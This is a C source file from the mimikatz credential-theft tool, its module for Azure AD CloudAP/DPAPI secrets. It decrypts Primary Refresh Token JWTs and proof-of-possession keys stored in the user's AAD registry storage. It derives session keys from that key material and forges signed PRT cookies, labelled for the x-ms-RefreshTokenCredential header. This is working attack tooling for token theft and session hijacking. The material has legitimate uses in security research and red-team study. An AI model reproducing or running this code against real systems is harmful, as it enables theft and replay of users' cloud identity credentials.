/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kuhl_m_dpapi_cloudap.h"

const GUID KIWI_DPAPI_ENTROPY_Packer__s_EntropyGUID = {0x74d3d547, 0xdabe, 0x4d9d, {0x91, 0xf1, 0x64, 0x62, 0x42, 0xca, 0xb5, 0x7c}};
const char KIWI_CryptUtil__s_KnownKey[] = "{VT,SG,ST,PD,TS}-BA-IS-BS-SG-SN+"; // ?

NTSTATUS kuhl_m_dpapi_cloudap_keyvalue_derived(int argc, wchar_t * argv[])
{
	LPCWSTR szKeyValue, szContext, szLabel, szKeyName, szPrt, szIat, szDerivedKey;
	LPSTR sSeedLabel, sJWT;
	__time32_t time32 = 0;
	BOOL isValidContext = FALSE, isDerivedKey = FALSE;
	PKIWI_POPKEY pKeyValue = NULL;
	LPVOID pDataOut;
	DWORD cbSeedLabel, cbKeyValue = 0, dwDataOutLen;
	PKIWI_POPKEY_HARD pHard;
	BYTE Context[24], DerivedKey[32];

	if(kull_m_string_args_byName(argc, argv, L"context", &szContext, NULL))
	{
		isValidContext = kull_m_string_stringToHex(szContext, Context, sizeof(Context));
		if(!isValidContext)
			PRINT_ERROR(L"/context must be an hex string of 48 char (24 bytes) -- it will be random\n");
	}
	if(!isValidContext)
		CDGenerateRandomBits(Context, sizeof(Context));

	kull_m_string_args_byName(argc, argv, L"label", &szLabel, L"AzureAD-SecureConversation");
	if(sSeedLabel = kull_m_string_unicode_to_ansi(szLabel))
	{
		cbSeedLabel = lstrlenA(sSeedLabel);
		kprintf(L"Label      : %.*S\nContext    : ", cbSeedLabel, sSeedLabel);
		kull_m_string_wprintf_hex(Context, sizeof(Context), 0);
		kprintf(L"\n");
		if(kull_m_string_args_byName(argc, argv, L"keyvalue", &szKeyValue, NULL))
		{
			if(lstrlen(szKeyValue) == (32 * 2))
			{
				if(kull_m_string_stringToHexBuffer(szKeyValue, (LPBYTE *) &pDataOut, &dwDataOutLen))
				{
					kprintf(L"Key type   : Software (RAW)\nClear key  : ");
					kull_m_string_wprintf_hex(pDataOut, dwDataOutLen, 0);
					kprintf(L"\n");
					isDerivedKey = kull_m_crypto_ngc_keyvalue_derived_software((PBYTE) sSeedLabel, cbSeedLabel, Context, sizeof(Context), (LPCBYTE) pDataOut, dwDataOutLen, DerivedKey, sizeof(DerivedKey));
					LocalFree(pDataOut);
				}
				else PRINT_ERROR(L"Unable to convert from hex\n");
			}
			else if(lstrlen(szKeyValue) == (178 * 2))
			{
				if(kull_m_string_stringToHexBuffer(szKeyValue, (LPBYTE *) &pDataOut, &dwDataOutLen))
				{
					if(kull_m_string_args_byName(argc, argv, L"keyname", &szKeyName, NULL))
					{
						kprintf(L"Key type   : TPM protected (RAW)\nKey Name   : %s\nOpaque key : ", szKeyName);
						kull_m_string_wprintf_hex(pDataOut, dwDataOutLen, 0);
						kprintf(L"\n");
						isDerivedKey = kull_m_crypto_ngc_keyvalue_derived_hardware((PBYTE) sSeedLabel, cbSeedLabel, Context, sizeof(Context), szKeyName, (LPCBYTE) pDataOut, dwDataOutLen, DerivedKey, sizeof(DerivedKey));
					}
					else PRINT_ERROR(L"An opaque key need a /keyname:SK-... to import it\n");
					LocalFree(pDataOut);
				}
				else PRINT_ERROR(L"Unable to convert from hex\n");
			}
			else if(kull_m_string_quick_urlsafe_base64_to_Binary(szKeyValue, (PBYTE *) &pKeyValue, &cbKeyValue))
			{
				if(kuhl_m_dpapi_unprotect_raw_or_blob(pKeyValue->key, cbKeyValue - FIELD_OFFSET(KIWI_POPKEY, key), NULL, argc, argv, NULL, 0, &pDataOut, &dwDataOutLen, NULL))
				{
					kprintf(L"Key type   : ");
					switch(pKeyValue->type)
					{
					case 1:
						kprintf(L"Software (DPAPI)\nClear key  : ");
						kull_m_string_wprintf_hex(pDataOut, dwDataOutLen, 0);
						kprintf(L"\n");
						isDerivedKey = kull_m_crypto_ngc_keyvalue_derived_software((PBYTE) sSeedLabel, cbSeedLabel, Context, sizeof(Context), (LPCBYTE) pDataOut, dwDataOutLen, DerivedKey, sizeof(DerivedKey));
						break;
					case 2:
						pHard = (PKIWI_POPKEY_HARD) pDataOut;
						kprintf(L"TPM protected (DPAPI)\nKey Name   : %.*s\nOpaque key : ", pHard->cbName / sizeof(wchar_t), pHard->data);
						kull_m_string_wprintf_hex(pHard->data + pHard->cbName, pHard->cbKey, 0);
						kprintf(L"\n");
						isDerivedKey = kull_m_crypto_ngc_keyvalue_derived_hardware((PBYTE) sSeedLabel, cbSeedLabel, Context, sizeof(Context), (LPCWSTR) pHard->data, pHard->data + pHard->cbName, pHard->cbKey, DerivedKey, sizeof(DerivedKey));
						break;
					default:
						PRINT_ERROR(L"KeyValue type is not supported (%u)\n", pKeyValue->type);
					}
					LocalFree(pDataOut);
				}
			}
			else PRINT_ERROR(L"Unable to decode base64\n");
		}
		else if(kull_m_string_args_byName(argc, argv, L"derivedkey", &szDerivedKey, NULL))
		{
			isDerivedKey = kull_m_string_stringToHex(szDerivedKey, DerivedKey, sizeof(DerivedKey));
			if(!isDerivedKey)
				PRINT_ERROR(L"a /derivedkey must be an hex string of 64 char (32 bytes)\n");
		}
		else  PRINT_ERROR(L"a /keyvalue:base64data (or raw 32/178 bytes in hex) must be present, or a /derivedkey");

		if(isDerivedKey)
		{
			kprintf(L"Derived Key: ");
			kull_m_string_wprintf_hex(DerivedKey, sizeof(DerivedKey), 0);
			kprintf(L"\n");
		}

		if(kull_m_string_args_byName(argc, argv, L"prt", &szPrt, NULL))
		{
			if(kull_m_string_args_byName(argc, argv, L"iat", &szIat, NULL))
				time32 = wcstol(szIat, NULL, 0);
			else kull_m_string_get_time32(&time32);
			kprintf(L"Issued at  : %ld\n", time32);

			if(isDerivedKey)
			{
				kprintf(L"\nSignature with key:\n");
				if(sJWT = generate_simpleSignature(Context, sizeof(Context), szPrt, &time32, DerivedKey, sizeof(DerivedKey), NULL, 0))
				{
					kprintf(L"%S\n\n(for x-ms-RefreshTokenCredential cookie by eg.)\n", sJWT);
					LocalFree(sJWT);
				}
			}
			if(pKeyValue && cbKeyValue && kull_m_string_args_byName(argc, argv, L"pop", NULL, NULL))
			{
				kprintf(L"\nSignature with POP key:\n");
				if(sJWT = generate_simpleSignature(Context, sizeof(Context), szPrt, &time32, (LPCBYTE) pKeyValue, cbKeyValue, (LPCBYTE) sSeedLabel, cbSeedLabel))
				{
					kprintf(L"%S\n\n(for x-ms-RefreshTokenCredential cookie by eg.)\n", sJWT);
					LocalFree(sJWT);
				}
			}
		}

		if(pKeyValue)
			LocalFree(pKeyValue);
	}
	return STATUS_SUCCESS;
}
PSTR basicEscapeJsonA(PCSTR toEscape)
{
	PSTR ret = NULL;
	DWORD i, j, lenEscaped;

	j = lenEscaped = lstrlenA(toEscape);
	for(i = 0; i < j; i++)
	{
		if((toEscape[i] == '\"') || (toEscape[i] == '/') || (toEscape[i] == '\\'))
			lenEscaped++;
	}

	if(ret = (PSTR) LocalAlloc(LPTR, lenEscaped + 1))
	{
		for(i = 0, j = 0; j < lenEscaped; i++, j++)
		{
			if((toEscape[i] == '\"') || (toEscape[i] == '/') || (toEscape[i] == '\\'))
				ret[j++] = '\\';
			ret[j] = toEscape[i];
		}
	}

	return ret;
}

PSTR basicUnEscapeJsonA(PCSTR toUnEscape)
{
	PSTR ret = NULL;
	DWORD i, j, lenUnEscaped;

	lenUnEscaped = lstrlenA(toUnEscape);

	if(ret = (PSTR) LocalAlloc(LPTR, lenUnEscaped + 1))
	{
		for(i = 0, j = 0; j < lenUnEscaped; i++, j++)
		{
			if(toUnEscape[j] == '\\')
				j++;
			ret[i] = toUnEscape[j];
		}
	}

	return ret;
}

PSTR generate_simpleHeader(PCSTR Alg, LPCBYTE Context, DWORD cbContext)
{
	PSTR base64 = NULL, header, ctxBase64, escapedCtxBase64;

	if(kull_m_string_quick_binary_to_base64A(Context, cbContext, &ctxBase64))
	{
		if(escapedCtxBase64 = basicEscapeJsonA(ctxBase64))
		{
			if(kull_m_string_sprintfA(&header, "{\"alg\":\"%s\", \"ctx\":\"%s\"}", Alg, escapedCtxBase64))
			{
				kull_m_string_quick_binary_to_urlsafe_base64A((const BYTE *) header, lstrlenA(header), &base64);
				LocalFree(header);
			}
			LocalFree(escapedCtxBase64);
		}
		LocalFree(ctxBase64);
	}
	return base64;
}

PSTR generate_simplePayload(PCWSTR PrimaryRefreshToken, __time32_t *iat)
{
	PSTR base64 = NULL, payload, prtDec, escapedPrt;
	PBYTE data;
	DWORD cbData;
	__time32_t time32;

	if(iat)
		time32 = *iat;
	else kull_m_string_get_time32(&time32);

	if(kull_m_string_quick_urlsafe_base64_to_Binary(PrimaryRefreshToken, &data, &cbData))
	{
		if(prtDec = (PSTR) LocalAlloc(LPTR, cbData + 1))
		{
			RtlCopyMemory(prtDec, data, cbData);
			if(escapedPrt = basicEscapeJsonA(prtDec))
			{
				if(kull_m_string_sprintfA(&payload, "{\"refresh_token\":\"%s\", \"is_primary\":\"true\", \"iat\":\"%ld\"}", escapedPrt, time32))
				{
					kull_m_string_quick_binary_to_urlsafe_base64A((const BYTE *) payload, lstrlenA(payload), &base64);
					LocalFree(payload);
				}
				LocalFree(escapedPrt);
			}
			LocalFree(prtDec);
		}
		LocalFree(data);
	}
	return base64;
}

PSTR generate_simpleSignature(LPCBYTE Context, DWORD cbContext, PCWSTR PrimaryRefreshToken, __time32_t *iat, LPCBYTE Key, DWORD cbKey, OPTIONAL LPCBYTE SeedLabel, OPTIONAL DWORD cbSeedLabel)
{
	PSTR jwt = NULL, header64, payload64, sHeader64PointPayload64, signature64;
	BYTE Hash[32], *pHash;
	DWORD cbHash;
	BOOL isSigned = FALSE;

	if(header64 = generate_simpleHeader("HS256", Context, cbContext))
	{
		if(payload64 = generate_simplePayload(PrimaryRefreshToken, iat))
		{
			if(kull_m_string_sprintfA(&sHeader64PointPayload64, "%s.%s", header64, payload64))
			{
				if(SeedLabel && cbSeedLabel)
				{
					if(kull_m_crypto_ngc_signature_pop((PBYTE) Key, cbKey, (PBYTE) SeedLabel, cbSeedLabel, (PBYTE) Context, cbContext, (PBYTE) sHeader64PointPayload64, lstrlenA(sHeader64PointPayload64), &pHash, &cbHash))
					{
						if(cbHash == sizeof(Hash))
						{
							RtlCopyMemory(Hash, pHash, sizeof(Hash));
							LocalFree(pHash);
							isSigned = TRUE;
						}
					}
				}
				else
				{
					isSigned = kull_m_crypto_ngc_signature_derived(Key, cbKey, (LPCBYTE) sHeader64PointPayload64, lstrlenA(sHeader64PointPayload64), Hash, sizeof(Hash));
				}

				if(isSigned)
				{
					if(kull_m_string_quick_binary_to_urlsafe_base64A(Hash, sizeof(Hash), &signature64))
					{
						kull_m_string_sprintfA(&jwt, "%s.%s", sHeader64PointPayload64, signature64);
						LocalFree(signature64);
					}
				}
				LocalFree(sHeader64PointPayload64);
			}
			LocalFree(payload64);
		}
		LocalFree(header64);
	}
	return jwt;
}

void dealWithKey(LPVOID pDataOut, DWORD dwDataOutLen)
{
	PSTR keyStr, unEscaped;
	if(keyStr = (PSTR) LocalAlloc(LPTR, dwDataOutLen + 1))
	{
		RtlCopyMemory(keyStr, pDataOut, dwDataOutLen);
		if(unEscaped = basicUnEscapeJsonA(keyStr))
		{
			kprintf(L"%S\n", unEscaped);
			LocalFree(unEscaped);
		}
		LocalFree(keyStr);
	}
}

void dealWithJwt(LPVOID pDataOut, DWORD dwDataOutLen)
{
	PSTR jwtStr, begin, end;
	PBYTE data;
	DWORD dwData;

	kprintf(L"Raw JWT: %.*S\n", dwDataOutLen, pDataOut);
	if(jwtStr = (PSTR) LocalAlloc(LPTR, dwDataOutLen + 1))
	{
		RtlCopyMemory(jwtStr, pDataOut, dwDataOutLen);
		begin = strchr(jwtStr, '.');
		if(begin)
		{
			begin++;
			end = strchr(begin, '.');
			if(end)
			{
				*end = '\0';
				if(kull_m_string_quick_urlsafe_base64_to_BinaryA(begin, &data, &dwData))
				{
					kprintf(L"Payload: %.*S\n", dwData, data);
					LocalFree(data);
				}
			}
		}
		LocalFree(jwtStr);
	}
}

void dealWithEntries(int argc, wchar_t * argv[], PKULL_M_REGISTRY_HANDLE hRegistry, HKEY hKeyProv)
{
	DWORD i, c, type, nbValues, szMaxValueNameLen, szMaxValueLen, szSecretName, szEntry, szData;
	PBYTE entry, data;
	wchar_t *secretName, *ptr;
	LPVOID pDataOut;
	DWORD dwDataOutLen;

	if(kull_m_registry_RegQueryInfoKey(hRegistry, hKeyProv, NULL, NULL, NULL, NULL, NULL, NULL, &nbValues, &szMaxValueNameLen, &szMaxValueLen, NULL, NULL))
	{
		szMaxValueNameLen++;
		if(secretName = (wchar_t *) LocalAlloc(LPTR, (szMaxValueNameLen + 1) * sizeof(wchar_t)))
		{
			if(entry = (PBYTE) LocalAlloc(LPTR, szMaxValueLen))
			{
				for(i = 0; i < nbValues; i++)
				{
					szSecretName = szMaxValueNameLen;
					szEntry = szMaxValueLen;
					if(kull_m_registry_RegEnumValue(hRegistry, hKeyProv, i, secretName, &szSecretName, NULL, &type, entry, &szEntry))
					{
						kprintf(L"\t[%s]\n", secretName);
						if(type == REG_MULTI_SZ)
						{
							for(ptr = (wchar_t *) entry, c = 0; *ptr; ptr += lstrlen(ptr) + 1)
							{
								if(!wcsncmp(ptr, L"1-", 2))
								{
									if(kull_m_string_quick_base64_to_Binary(ptr + 2, &data, &szData))
									{
										if(kuhl_m_dpapi_unprotect_raw_or_blob(data, szData, NULL, argc, argv, &KIWI_DPAPI_ENTROPY_Packer__s_EntropyGUID, sizeof(KIWI_DPAPI_ENTROPY_Packer__s_EntropyGUID), &pDataOut, &dwDataOutLen, NULL))
										{
											switch(c)
											{
											case 0:
												kprintf(L" [JWT]\n");
												dealWithJwt(pDataOut, dwDataOutLen);
												break;
											case 1:
												kprintf(L" [Key]\n");
												dealWithKey(pDataOut, dwDataOutLen);
												break;
											default:
												PRINT_ERROR(L"Unknow type: %u\n", c);
												kull_m_string_wprintf_hex(pDataOut, dwDataOutLen, 1);
												kprintf(L"\n");
											}
											LocalFree(pDataOut);
										}
										c++;
										LocalFree(data);
									}
								}
							}
						}
						else PRINT_ERROR(L"Incompatible REG type: %u\n", type);
					}
				}
				LocalFree(entry);
			}
			LocalFree(secretName);
		}
	}
}

NTSTATUS kuhl_m_dpapi_cloudap_fromreg(int argc, wchar_t * argv[])
{
	PKULL_M_REGISTRY_HANDLE hRegistry;
	HKEY hKeyStorage, hKeyProv;
	DWORD i, nbSubKeys, szMaxSubKeyLen, szKey;
	wchar_t * keyName;
	if(kull_m_registry_open(KULL_M_REGISTRY_TYPE_OWN, NULL, FALSE, &hRegistry)) // todo: offline
	{
		if(kull_m_registry_RegOpenKeyEx(hRegistry, HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\AAD\\Storage", 0, KEY_READ, &hKeyStorage))
		{
			if(kull_m_registry_RegQueryInfoKey(hRegistry, hKeyStorage, NULL, NULL, NULL, &nbSubKeys, &szMaxSubKeyLen, NULL, NULL, NULL, NULL, NULL, NULL))
			{
				szMaxSubKeyLen++;
				if(keyName = (wchar_t *) LocalAlloc(LPTR, (szMaxSubKeyLen + 1) * sizeof(wchar_t)))
				{
					for(i = 0; i < nbSubKeys; i++)
					{
						szKey = szMaxSubKeyLen;
						if(kull_m_registry_RegEnumKeyEx(hRegistry, hKeyStorage, i, keyName, &szKey, NULL, NULL, NULL, NULL))
						{
							kprintf(L"[%u] %s\n", i, keyName);

							if(kull_m_registry_RegOpenKeyEx(hRegistry, hKeyStorage, keyName, 0, KEY_READ, &hKeyProv))
							{
								dealWithEntries(argc, argv, hRegistry, hKeyProv);
								kull_m_registry_RegCloseKey(hRegistry, hKeyProv);
							}
						}
					}
					LocalFree(keyName);
				}
			}
			kull_m_registry_RegCloseKey(hRegistry, hKeyStorage);
		}
		else PRINT_ERROR_AUTO(L"kull_m_registry_RegOpenKeyEx");
		kull_m_registry_close(hRegistry);
	}
	return STATUS_SUCCESS;
}